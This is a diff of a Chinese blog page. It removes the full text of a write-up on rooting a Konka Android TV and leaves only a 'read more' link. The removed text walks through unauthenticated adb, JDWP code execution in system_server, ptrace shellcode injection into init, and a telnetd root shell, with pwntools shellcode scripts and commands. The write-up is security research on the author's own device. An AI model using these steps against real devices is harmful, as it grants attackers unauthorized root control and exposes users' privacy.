@@ -677,7 +677,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-11-21 23:31:11" itemprop="dateModified" datetime="2023-11-21T23:31:11+08:00">2023-11-21</time>
+                <time title="修改时间：2023-11-21 23:38:05" itemprop="dateModified" datetime="2023-11-21T23:38:05+08:00">2023-11-21</time>
               </span>
 
           
@@ -695,78 +695,14 @@
 <p><a target="_blank" rel="noopener" href="https://github.com/5ec1cff/my-notes/blob/8fde03d5031265a8c90df30ed823cc057e1014b2/pwn-tv.md">原文</a>作于 2023.01.27, 整理于 2023.11.21</p>
 </blockquote>
 <p>老家的 Konka 电视是个 Android 系统，曾经 nmap 扫描过，发现 adb 是开放的，这次过年回去研究了一下，发现可以提权。</p>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>使用 adb 是可以直接连接的，uid 是 shell ，不需要在 TV 上进行任何授权。</p>
-<p>看看系统属性：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[ro.adb.secure]: [0]</span><br><span class="line">[ro.allow.mock.location]: [1]</span><br><span class="line">[ro.board.platform]: [bigfish]</span><br><span class="line">[ro.boot.selinux]: [enforcing]</span><br><span class="line">[ro.build.tags]: [release-keys]</span><br><span class="line">[ro.build.type]: [user]</span><br><span class="line">[ro.build.version.all_codenames]: [REL]</span><br><span class="line">[ro.build.version.base_os]: []</span><br><span class="line">[ro.build.version.codename]: [REL]</span><br><span class="line">[ro.build.version.incremental]: [eng.KK.20200408.160235]</span><br><span class="line">[ro.build.version.release]: [5.1.1]</span><br><span class="line">[ro.build.version.sdk]: [22]</span><br><span class="line">[ro.build.version.security_patch]: [2017-06-01]</span><br><span class="line">[ro.debuggable]: [1]</span><br><span class="line">[ro.drm.tvp]: [false]</span><br><span class="line">[ro.factorytest]: [0]</span><br></pre></td></tr></table></figure>
-
-<p>内核版本：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux version 3.18.16_s5 (wangkang@ubuntu) (gcc version 4.9.1 20140529 (prerelease) (crosstool-NG linaro-1.13.1-4.9-2014.07 - Linaro GCC 4.9-2014.06) ) #1 SMP Wed Apr 8 16:18:43 CST 2020</span><br></pre></td></tr></table></figure>
-
-<p>cpu 是 arm64 的，Android SDK 版本 22 .</p>
-<p><code>ro.adb.secure</code> 是 0 ，因此 adb 不需要验证即可连接。</p>
-<p><code>ro.debuggable</code> 是 1 ，因此这个系统是可调试的</p>
-<p><code>ro.build.type=user</code> ，这是个 user 构建的系统。</p>
-<p>系统中没有 su ，尝试了一下 <code>adb root</code> ，执行倒是成功了，但是进入 adb shell 仍然不是 root 。此外，使用 <code>run-as</code> 总是报错找不到包，看来想要得到 root 甚至其他用户都没那么容易。</p>
-<p>不过 <code>ro.debuggable=1</code> 还会影响别的东西，比如，app 进程的调试默认都是打开的。使用 <code>adb jdwp</code> 可以看到一串 pid ，其中甚至包括 system_server 的。</p>
-<p>使用 <code>adb forward tcp:xxxxx jdwp:</code> 可以转发 jdwp ，利用 jdb 连接，真的可以对系统服务进行调试！</p>
-<blockquote>
-<p>但是我们不能对 zygote 进行调试，因为 Android 在设计上就是关闭的。  </p>
-</blockquote>
-<p>注意到 system_server 的权能(Capability)是这样的：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CapInh: 0000000000000000</span><br><span class="line">CapPrm: 0000001006893c20</span><br><span class="line">CapEff: 0000001006893c20</span><br></pre></td></tr></table></figure>
-
-<p>其中包括了 cap_sys_ptrace ，意味着可以对任意进程进行调试——无视了 uid 等隔离。不过 CapInh 为 0 ，意味着 execve 的进程不具备这些权限。</p>
-<p>另一方面，系统中还存在一个大洞：<code>getenforce</code> 返回的是 <code>Disable</code> ，这意味着 SELinux 的保护也不存在！</p>
-<p>如此一来，如何提取 root 权限就有一条比较清晰的路线了：</p>
-<ol>
-<li>系统服务暴露的 jdwp 让我们执行任意代码  </li>
-<li>在系统服务中加载 native lib ，ptrace 控制任意一个 root 进程  </li>
-<li>控制 root 进程反弹 shell</li>
-</ol>
-<p>理论存在，实践开始！</p>
-<h2 id="第一阶段：取得-system-和-ptrace-权限"><a href="#第一阶段：取得-system-和-ptrace-权限" class="headerlink" title="第一阶段：取得 system 和 ptrace 权限"></a>第一阶段：取得 system 和 ptrace 权限</h2><p>理论上来说我们可以用 <code>am attach-agent</code> 注入一个 agent lib ，这样就不需要和 jdwp 打交道了，但是这个 API 22 的 am 竟然没有 attach-agent 子命令。我不打算仔细研究是否能注入 agent 了，直接利用 jdwp 就行。</p>
-<p><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/7/docs/technotes/tools/windows/jdb.html">jdb - The Java Debugger</a></p>
-<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/37569125/how-to-run-custom-code-in-jdb-session">java - How to run custom code in JDB session? - Stack Overflow</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2021/08/06/%E6%B5%85%E6%9E%90JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">浅析JDWP远程命令执行漏洞 &#x5b; Mi1k7ea &#x5d;</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/IOActive/jdwp-shellifier">IOActive&#x2F;jdwp-shellifier</a></p>
-<p>jdwp 需要在线程挂起的时候才能执行大部分操作，比如执行任意代码。</p>
-<p>jdb 中可以使用 <code>eval/dump/print</code> 执行代码，但我们首先需要挂起一个线程，</p>
-<p><code>threads</code>  列出线程信息（注意线程 id 并不是 linux 的 tid），由于是手动操作，为了避免长时间挂起线程影响系统，这里我选择挂起 <code>watchdog</code> （但是实际上一直挂起它也会在某些情况下导致系统卡住，如 activity 切换的时候，这时候 resume 或退出调试器就好了）。</p>
-<p>使用 <code>suspend tid</code> 挂起， <code>resume tid</code> 恢复（不写 tid 默认所有线程）。</p>
-<p>使用 <code>thread tid</code> 进入线程，<code>stepi</code> 步进，这时候就可以用 <code>eval</code> 等命令执行任意代码了。</p>
-<p><code>eval java.lang.Runtime.getRuntime().exec</code> 可以执行任意程序，我们可以用 busybox 的 telnetd 在网络上开启 shell （可以用 Magisk busybox）：</p>
-<p><code>busybox telnetd -l /system/bin/shell -p 8023</code></p>
-<p>但是由于 system_server 的权能无法继承，因此这个 shell 没什么用（甚至无法绑定 telnet 默认端口 23，而系统服务是有 cap_bind_net_service 权限的），最多访问一些系统目录。</p>
-<p>编写了一个简单的 lib 测试，<code>eval java.lang.System.load(&quot;/data/local/tmp/libpwn.so&quot;)</code> 加载，可以发现 root 进程确实可以 ptrace 附加（此处附加了 init ，也许附加 zygote64 会更好）</p>
-<h2 id="第二阶段：控制-root-进程"><a href="#第二阶段：控制-root-进程" class="headerlink" title="第二阶段：控制 root 进程"></a>第二阶段：控制 root 进程</h2><p>思路：mmap rwx 内存区域，写 shellcode ，执行 fork 和 execve 系统调用启动 telnetd 。</p>
-<p>可以利用 <a target="_blank" rel="noopener" href="https://github.com/Gallopsled/pwntools">pwntools</a> 生成 shellcode 。</p>
-<p>在 android 中， <code>SYS_fork</code> 并不存在，libc fork 采用的是 <code>clone</code> 实现 fork</p>
-<p>可以参考 AOSP:</p>
-<p><a target="_blank" rel="noopener" href="https://cs.android.com/android/platform/superproject/+/master:bionic/libc/bionic/fork.cpp?q=fork">fork.cpp</a></p>
-<p>我们使用 jdwp 加载一个 so ，在里面 ptrace init 注入 shellcode 执行。</p>
-<p>ptrace 的源代码在这里：<a target="_blank" rel="noopener" href="https://gist.github.com/5ec1cff/0cb045c79d78aa02f927edfc54be5ade#file-pt-inject-c">https://gist.github.com/5ec1cff/0cb045c79d78aa02f927edfc54be5ade#file-pt-inject-c</a></p>
-<p>下面详细说说 shellcode 怎么得来的：</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    context(arch=<span class="string">&#x27;aarch64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">    <span class="comment"># CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD</span></span><br><span class="line">    code = pwnlib.shellcraft.aarch64.linux.syscall(<span class="string">&#x27;SYS_clone&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>, pwnlib.constants.<span class="built_in">eval</span>(<span class="string">&#x27;SIGCHLD&#x27;</span>) | <span class="number">0x01000000</span>|<span class="number">0x00200000</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    code += <span class="string">&#x27;cmp x0, #0x0\n&#x27;</span></span><br><span class="line">    code += <span class="string">&#x27;b.gt aaa\n&#x27;</span></span><br><span class="line">    code += pwnlib.shellcraft.aarch64.pushstr(<span class="string">&quot;/data/local/tmp/busybox&quot;</span>)</span><br><span class="line">    code += pwnlib.shellcraft.aarch64.pushstr_array(<span class="string">&quot;x14&quot;</span>, [<span class="string">&quot;telnetd&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;/system/bin/sh&quot;</span>])</span><br><span class="line">    code += pwnlib.shellcraft.aarch64.linux.syscall(<span class="string">&#x27;SYS_execve&#x27;</span>, <span class="string">&#x27;sp&#x27;</span>, <span class="string">&#x27;x14&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    code += <span class="string">&#x27;aaa:\n&#x27;</span></span><br><span class="line">    code += pwnlib.shellcraft.aarch64.<span class="built_in">breakpoint</span>()</span><br><span class="line">    <span class="built_in">print</span>(code)</span><br><span class="line">    c = asm(code)</span><br></pre></td></tr></table></figure>
-
-<p>但是使用上面生成的 shellcode 会出现 SIGBUS ：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">7fd4b09000-7fd4b2a000 rw-p 00000000 00:00 0                              [stack]</span><br><span class="line"></span><br><span class="line">D:child stopped by sig: 7 Bus error</span><br><span class="line">D:fault addr: 0x7fd4b27dc0</span><br><span class="line"></span><br><span class="line">I:sp=0x7fd4b27da8</span><br><span class="line">I:pc=0x7409439070</span><br></pre></td></tr></table></figure>
-
-<p>SIGBUS 应该不是栈溢出，查了一下是 arm64 stp, ldp 指令要求 sp 16 位对齐</p>
-<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/72724797/how-do-i-parse-arm64-assembly-sigbus-error">How do I parse ARM64 assembly SIGBUS error? - Stack Overflow</a></p>
-<p>是 pushstr_array 导致的，看起来是 pwntools 的问题，但是 pwntools 又说修了。</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/Gallopsled/pwntools/issues/1549">aarch64.linux.pushstr_array is broken · Issue #1549 · Gallopsled&#x2F;pwntools</a></p>
-<p>最后干脆 execve 一个跳板程序（这里就执行一个 sh <code>/data/local/tmp/pwn.sh</code>），不需要 arg 也就不会用到 pushstr_array ，总算不会 SIGBUS 了。</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    context(arch=<span class="string">&#x27;aarch64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">    code = pwnlib.shellcraft.aarch64.linux.syscall(<span class="string">&#x27;SYS_clone&#x27;</span>, pwnlib.constants.<span class="built_in">eval</span>(<span class="string">&#x27;SIGCHLD&#x27;</span>), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    code += <span class="string">&#x27;cmp w0, #0x0\n&#x27;</span></span><br><span class="line">    code += <span class="string">&#x27;b.gt aaa\n&#x27;</span></span><br><span class="line">    code += pwnlib.shellcraft.aarch64.pushstr(<span class="string">&quot;/data/local/tmp/pwn.sh&quot;</span>)</span><br><span class="line">    code += pwnlib.shellcraft.aarch64.linux.syscall(<span class="string">&#x27;SYS_execve&#x27;</span>, <span class="string">&#x27;sp&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    code += <span class="string">&#x27;aaa:\n&#x27;</span></span><br><span class="line">    code += pwnlib.shellcraft.aarch64.<span class="built_in">breakpoint</span>()</span><br><span class="line">    <span class="built_in">print</span>(code)</span><br><span class="line">    c = asm(code)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">list</span>(c))</span><br></pre></td></tr></table></figure>
-
-<p>最后再完善一下 JDWP 注入，代码：</p>
-<p><a target="_blank" rel="noopener" href="https://gist.github.com/5ec1cff/0cb045c79d78aa02f927edfc54be5ade#file-jdwp-py">https://gist.github.com/5ec1cff/0cb045c79d78aa02f927edfc54be5ade#file-jdwp-py</a></p>
-<p>参考了 jdwp-shellifier 和以下项目。</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/WindySha/jdwp-xposed-injector">WindySha&#x2F;jdwp-xposed-injector: This is an injection tool that can inject xposed module to debuggable app by jdwp.</a></p>
-<p><a target="_blank" rel="noopener" href="https://windysha.github.io/2022/02/19/%E4%B8%80%E7%A7%8D%E5%9F%BA%E4%BA%8EJDWP%E5%8A%A8%E6%80%81%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E7%9A%84%E6%96%B9%E6%A1%88/">一种基于JDWP动态注入代码的方案 | Windy’s Journal</a></p>
-<h2 id="PWNED"><a href="#PWNED" class="headerlink" title="PWNED"></a>PWNED</h2><p><img src="/my-blog/images/20230126_01.png"></p>
-<p>通过 telnet 即可访问 root shell 。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一次 pwn 算是同时学习了利用 Java 的调试协议 (JDWP) 和 linux 调试 API (ptrace) 实现任意代码的执行，同时也体会到，随意开放调试是会带来巨大风险的。这台电视的系统不仅在网络上开放了 adb ，还允许调试任意进程，SELinux 被禁用，利用 system_server 的 ptrace 特权从而得到 root 权限——正是这一系列安全机制在系统的开发阶段被忽视，才有了提权的可能。但仔细一想，最恐怖的还是任意安装到电视的具有网络访问权限的 App 都可以这样获得 root 权限，掌控整台设备。假如电视还有摄像头、麦克风等外设（当然这台是没有的），必然会进一步威胁到用户的隐私。因此，作为厂商，在系统安全方面一定要做到合规。</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/my-blog/2023/01/27/pwn-tv/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
